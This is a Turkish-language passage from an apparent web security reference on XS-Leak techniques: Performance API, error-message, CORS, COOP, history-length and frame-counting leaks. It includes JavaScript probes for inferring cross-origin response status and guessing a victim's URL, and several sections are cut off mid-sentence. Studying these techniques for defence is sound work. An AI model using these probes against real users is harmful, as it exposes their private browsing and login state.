Önceki teknikte, GC'deki tarayıcı hataları nedeniyle **yüklenemeyen kaynaklar iki kez yüklenir** olarak belirlendi. Bu, Performans API'sinde birden fazla giriş oluşturur ve bu nedenle algılanabilir.

### İstek Birleştirme Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara yol açan istekler birleştirilemez.
* **Örnek Kod**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalenin bir tablosunda bulundu, ancak teknikle ilgili bir açıklama bulunamadı. Bununla birlikte, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### Boş Sayfa Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Boş yanıtlar, kaynak zamanlama girişi oluşturmaz.
* **Örnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bir isteğin boş bir HTTP yanıt gövdesiyle sonuçlandığını tespit edebilir çünkü **boş sayfalar bazı tarayıcılarda performans girişi oluşturmaz**.

### **XSS-Auditor Sızıntısı**

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Güvenlik İddialarında XSS Denetleyicisini kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklediğinde yanıtlarda meydana gelen değişiklikleri gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
* **Örnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik İddialarında (SA), başlangıçta Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanan XSS Denetleyicisi, paradoksal bir şekilde hassas bilgilerin sızdırılmasına neden olmak için kullanılabilir. Bu yerleşik özellik Google Chrome'dan (GC) kaldırıldı, ancak SA'da hala mevcuttur. 2013 yılında, Braun ve Heiderich, XSS Denetleyicisinin yanlış pozitiflere yol açabilecek şekilde meşru betikleri engelleyebileceğini gösterdiler. Araştırmacılar, bu temel alınarak, hassas bilgilerin çıkarılması ve çapraz kaynak sayfalarında belirli içeriğin tespit edilmesi için teknikler geliştirdiler. Bu kavrama XS-Leak denir ve başlangıçta Terada tarafından bildirilmiş ve Heyes tarafından bir blog yazısında ayrıntılı olarak açıklanmıştır. Bu teknikler GC'deki XSS Denetleyicisiyle ilgiliyken, SA'da XSS Denetleyicisi tarafından engellenen sayfalar, Performans API'sinde giriş oluşturmaz, böylece hassas bilgilerin sızdırılabileceği bir yöntem ortaya çıkar.

### X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing
### Yönlendirme Başlangıcı Sızıntısı

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: Yönlendirme
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet**: Kaynak zamanlama girişi, bir yönlendirmenin başlangıç zamanını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların, çapraz kaynak istekleri için çok fazla bilgi kaydettiği davranışını istismar eden bir XS-Leak örneği bulduk. Standart, çapraz kaynak kaynakları için sıfıra ayarlanması gereken bir alt küme özniteliği tanımlar. Ancak, **SA**'da hedef sayfa tarafından yönlendirilip yönlendirilmediği, **Performans API**'sini sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek tespit edilebilir.

### Süre Yönlendirme Sızıntısı

* **Ekleme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirme
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet**: Bir yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatiftir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, bir yönlendirme sonucunda gerçekleşen isteklerin süresi **negatif** ve bu nedenle yönlendirme olmayan isteklerden **ayrılabilir**.

### CORP Sızıntısı

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: Başlık
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet**: CORP ile korunan kaynaklar, kaynak zamanlama girişleri oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. CORP etkin kaynaklar için SA hiçbir performans girişi oluşturmayacaktır.

### Hizmet İşçisi

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Özet**: Belirli bir kök için bir hizmet işçisinin kaydedilip kaydedilmediği tespit edilebilir.
* **Kod Örneği**:

Hizmet işçileri, bir kökte çalışan olaya dayalı betik bağlamlarıdır. Bir web sayfasının arka planında çalışırlar ve çevrimdışı web uygulaması oluşturmak için kaynakları **ön belleğe alabilir**, değiştirebilir ve önbelleğe alabilirler.\
Bir hizmet işçisi tarafından **ön belleğe alınan bir kaynak**, **iframe** aracılığıyla erişildiğinde, kaynak **hizmet işçisi önbelleğinden yüklenir**.\
Kaynağın **hizmet işçisi önbelleğinden yüklendiği** tespit edilmek istenirse, **Performans API** kullanılabilir.\
Bu ayrıca bir Zamanlama saldırısıyla da yapılabilir (daha fazla bilgi için makaleye bakın).

### Önbellek

* **Ekleme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Özet**: Bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performans API](xs-search.md#performance-api) kullanılarak bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.

### Ağ Süresi

* **Ekleme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Özet**: Bir isteğin ağ süresi, `performance` API'sından alınabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata Mesajları Tekniği

### Medya Hatası

* **Ekleme Yöntemleri**: HTML Öğeleri (Video, Ses)
* **Algılanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Özet**: Firefox'ta çapraz kökenli bir isteğin durum kodu kesin bir şekilde sızdırılabilir.
* **Kod Örneği**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` arayüzünün `message` özelliği, başarılı bir şekilde yüklenen kaynakları benzersiz bir dizeyle tanımlar. Bir saldırgan, bu özelliği kullanarak mesaj içeriğini gözlemleyerek bir kaynak üzerindeki cross-origin yanıt durumunu çıkarabilir.

### CORS Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddiaları (SA) içinde, CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Örnek Kod**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın Webkit tabanlı tarayıcıların CORS isteklerini nasıl işlediğini istismar ederek cross-origin bir site'nin yönlendirme hedefini çıkarmasını sağlar. Özellikle, kullanıcı durumuna dayalı olarak bir yönlendirme yapan hedef siteye bir CORS etkin istek gönderildiğinde ve tarayıcı daha sonra isteği reddederse, hata mesajı içinde yönlendirmenin hedefinin tam URL'si açığa çıkar. Bu zafiyet, sadece yönlendirmenin gerçekleştiğini değil, aynı zamanda yönlendirmenin hedefini ve içerebileceği **duyarlı sorgu parametrelerini** de ortaya çıkarır.

### SRI Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddiaları (SA) içinde, CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Örnek Kod**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, ayrıntılı hata mesajlarını kullanarak cross-origin yanıtların boyutunu çıkarabilir. Bu, Subresource Integrity (SRI) mekanizmasının, genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrulamak için bütünlük özniteliğini kullandığından mümkündür. SRI'nin cross-origin kaynaklarda çalışabilmesi için bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrolüne tabi tutulmazlar. Güvenlik İddiaları (SA) içinde, CORS hata XS-Leak gibi, bir bütünlük özniteliği içeren bir fetch isteği sonrasında bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük özniteliğine **sahte bir karma değeri** atayarak bu hatayı kasıtlı olarak tetikleyebilir. SA'da, ortaya çıkan hata mesajı istenen kaynağın içerik uzunluğunu yanlışlıkla ortaya çıkarır. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki farklılıkları ayırt etmesine olanak tanır ve sofistike XS-Leak saldırıları için yol açar.

### CSP İhlali/Tespiti

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Özet:** CSP'de sadece hedef web sitesine izin verildiğinde, CSP fark edilebilir bir hataya neden olur.
* **Örnek Kod**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak cross-origin bir sitenin farklı bir kök siteye yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı yönlendirmeyi tespit edebilir, ancak ayrıca yönlendirme hedefinin alan adı da sızar. Bu saldırının temel fikri, saldırgan sitesinde hedef alan adına izin vermektedir. Bir istek hedef alan adına gönderildiğinde, bu alan adı cross-origin bir etki alanına yönlendirilir. CSP, buna erişimi engeller ve bir sızıntı tekniği olarak kullanılan bir ihlal raporu oluşturur. Tarayıcıya bağlı olarak, bu rapor yönlendirmenin hedef konumunu sızdırabilir. Modern tarayıcılar yönlendirildiği URL'yi belirtmese de, hala bir cross-origin yönlendirme tetiklendiğini tespit edebilirsiniz.

### Önbellek

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Özet:** Önbellekten dosyayı temizleyin. Hedef sayfayı açın ve dosyanın önbellekte olup olmadığını kontrol edin.
* **Örnek Kod:**

Tarayıcılar tüm web siteleri için paylaşılan bir önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın belirli bir dosyayı **isteyip istemediği** çıkarılabilir.

Bir sayfa, kullanıcı giriş yaptığında yalnızca bir resmi yüklerse, **kaynağı geçersiz kılabilirsiniz** (eğer önbellekteyse artık önbellekte olmaz, daha fazla bilgi için bağlantılara bakın), bu kaynağı yükleyebilecek bir isteği gerçekleştirin ve kaynağı **hatalı bir istekle yüklemeye çalışın** (örneğin, aşırı uzun bir referer başlığı kullanarak). Kaynak yüklemesi **herhangi bir hata tetiklemediyse**, bu kaynak **önbellekte** olduğu anlamına gelir.

### CSP Yönergesi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Özet:** CSP başlık yönergeleri, CSP iframe özniteliğini kullanarak sızan politika ayrıntılarını ortaya çıkarabilir.
* **Örnek Kod**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir özellik, web sayfalarının bir iframe öğesine bir öznitelik atayarak bir İçerik Güvenlik Politikası (CSP) önermesine izin
### CORB

* **Dahil Etme Yöntemleri**: HTML Elementleri
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Özet**: CORB saldırganlara istekte **`nosniff` başlığının varlığını** tespit etme imkanı sağlayabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıyı kontrol edin.

### CORS hatası Origin Reflection yanlısı yapılandırmada <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Özet**: Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir saldırgan bu davranışı istismar ederek kaynağı CORS modunda almaya çalışabilir. Eğer bir hata tetiklenmezse, kaynağın web'den doğru bir şekilde alındığı anlamına gelir. Eğer bir hata tetiklenirse, bu kaynağın önbellekten erişildiği anlamına gelir (hata, önbelleğe CORS başlığıyla orijinal alan adını ve saldırganın alan adını izin veren bir yanıtı kaydederken oluşur).\
Unutulmamalıdır ki, eğer origin yansıtılmıyorsa ancak joker karakteri kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu yöntem çalışmayacaktır.

## Okunabilir Öznitelik Tekniği

### Fetch Yönlendirmesi

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Özet**: GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaque-redirect) kontrol etmeye olanak sağlar.
* **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Fetch API kullanarak `redirect: "manual"` ve diğer parametrelerle bir istek göndererek, `response.type` özniteliğini okumak mümkündür ve eğer bu öznitelik `opaqueredirect` ile eşitse, yanıt bir yönlendirmedir.

### COOP

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Özet**: Cross-Origin Opener Policy (COOP) tarafından korunan sayfalar, çapraz köken etkileşimlerden erişimi engeller.
* **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, çapraz kökenli bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından harici sitelerin keyfi pencere referanslarına erişmesini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına** erişmeye çalışarak tespit edilebilir. COOP koşullu olarak uygulandığında, **`opener` özelliği** bir ipucu olur: COOP aktif olduğunda **tanımlanmamış** olurken, yokluğunda **tanımlanır**.

### URL Maksimum Uzunluğu - Sunucu Tarafı

* **Dahil Etme Yöntemleri**: Fetch API, HTML Elementleri
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Özet**: Yönlendirme yanıtının uzunluğu nedeniyle yanıtlar arasındaki farkları tespit etmek mümkündür, çünkü sunucu bir hata ile yanıt verir ve bir uyarı oluşturulur.
* **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer sunucu tarafında bir yönlendirme, **yönlendirmede kullanıcı girişi** ve **ekstra veri** kullanıyorsa, bu davranışı tespit etmek mümkündür çünkü genellikle **sunucuların bir istek uzunluk sınırı** vardır. Eğer **kullanıcı verisi** bu **uzunluğa - 1** eşitse, çünkü **yönlendirme** bu veriyi kullanıyor ve **ekstra bir şey ekliyor**, bu **Hata Olayları** aracılığıyla tespit edilebilen bir **hata tetiklenir**.

Eğer bir kullanıcıya çerezler atayabilirseniz, bu saldırıyı **yeterli sayıda çerez atayarak** da gerçekleştirebilirsiniz ([**cookie bombası**](hacking-with-cookies/cookie-bomb.md)). Bu durumda, doğru yanıtın **boyutu arttığında** bir **hata** tetiklenir. Bu durumda, hatayı kontrol etmek için aynı site üzerinden bu isteği tetiklerseniz, `<script>` otomatik olarak çerezleri gönderir.\
**Çerez bombası + XS-Search** örneği, bu yazının İstenmeyen çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tür bir saldırı için genellikle `SameSite=None` veya aynı bağlamda olmak gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-
### Maksimum Yönlendirmeler

* **Dahil Etme Yöntemleri**: Fetch API, Frames
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Özet:** Tarayıcının yönlendirme sınırını kullanarak URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının takip edeceği **maksimum** yönlendirme sayısı **20** ise, bir saldırgan kendi sayfasını **19 yönlendirme** ile yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya **yönlendirebilir**. Eğer bir **hata** tetiklenirse, o zaman sayfa kurbanı **yönlendirmeye çalışıyordu**.

### Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Pop-uplar
* **Tespit Edilebilir Fark**: Yönlendirmeler
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Özet:** JavaScript kodu tarayıcı geçmişini manipüle edebilir ve uzunluk özelliği ile erişilebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'si**, JavaScript kodunun tarayıcı geçmişini manipüle etmesine izin verir, bu da bir kullanıcının ziyaret ettiği sayfaları **kaydeder**. Bir saldırgan, dahil etme yöntemi olarak uzunluk özelliğini kullanabilir: JavaScript ve HTML gezinmesini tespit etmek için.\
**`history.length`'i kontrol ederek**, bir kullanıcının bir sayfaya **gezinmesini sağlayarak**, onu **aynı kök URL'ye geri değiştirerek** ve **`history.length`**'in yeni değerini **kontrol ederek**.

### Aynı URL ile Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Pop-uplar
* **Tespit Edilebilir Fark**: URL, tahmin edilen URL ile aynı mı
* **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/pop-up'ın konumunun belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
* **Kod Örneği**: Aşağıda

Bir saldırgan, JavaScript kodunu kullanarak **çerçeve/pop-up konumunu tahmin edilen bir URL'ye manipüle edebilir** ve **hemen** **`about:blank`'e değiştirebilir**. Eğer geçmiş uzunluğu artarsa, bu URL'nin doğru olduğu ve **artma zamanı olduğu anlamına gelir çünkü URL aynıysa yeniden yüklenmez**. Eğer artmazsa, o zaman **tahmin edilen URL'yi yüklemeye çalıştı** ama biz **hemen sonra** **`about:blank`'i yüklediğimiz için**, geçmiş uzunluğu tahmin edilen URL'yi yüklerken hiçbir zaman artmadı.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Sayımı

* **Dahil Etme Yöntemleri**: Frame'ler, Pop-up'lar
* **Tespit Edilebilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Özet:** `window.length` özelliğini inceleyerek iframe elemanlarının sayısını değerlendirin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` ile açılan bir web sayfasındaki **frame sayısını saymak**, kullanıcının o sayfadaki **durumunu belirlemeye yardımcı olabilir**.\
Ayrıca, sayfanın her zaman aynı sayıda frame'e sahip olması durumunda, frame sayısını **sürekli olarak kontrol etmek**, bilgi sızdırabilecek bir **desen**i belirlemeye yardımcı olabilir.

Bu tekniğin bir örneği, Chrome'da bir **PDF**'nin **frame sayımı** ile tespit edilebilir çünkü dahili olarak bir `embed` kullanılır. Bu tekniğin ilginç olabileceği `zoom`, `view`, `page`, `toolbar` gibi bazı içerik üzerinde kontrol sağlayan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) bulunmaktadır.

### HTMLElements

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Tespit Edilebilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Özet:** Sızan değeri okuyarak 2 olası durum arasında ayrım yapın
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanları aracılığıyla bilgi sızıntısı, özellikle kullanıcı bilgilerine dayalı olarak dinamik medya dosyaları oluşturulduğunda veya medya boyutunu değiştiren filigranlar eklendiğinde web güvenliğinde bir endişe oluşturur. Saldırganlar, belirli HTML elemanları tarafından ortaya çıkarılan bilgilere dayanarak olası durumlar arasında ayrım yapmak için bunu kullanabilir.

### HTML Elemanları Tarafından Ortaya Çıkarılan Bilgiler

- **HTMLMediaElement**: Bu eleman, medyanın `duration` ve `buffered` sürelerini, API'sı aracılığıyla erişilebilir hale getirir.
[HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` özelliklerini ortaya çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur ve medya içeriği hakkında daha detaylı bilgi sunar.
[HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Bu işlev, video oynatma kalitesi hakkında ayrıntılar sağlar ve işlenen video veri miktarını gösterebilen `totalVideoFrames` özelliğini içerir.
[getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` değerlerini sızdırır. Ancak, bir resim geçersiz ise, bu özellikler 0 olarak döner ve `image.decode()` işlevi reddedilir, böylece resmin düzgün bir şekilde yüklenemediği belirtilir.
[HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### CSS Özelliği

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Tespit Edilebilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
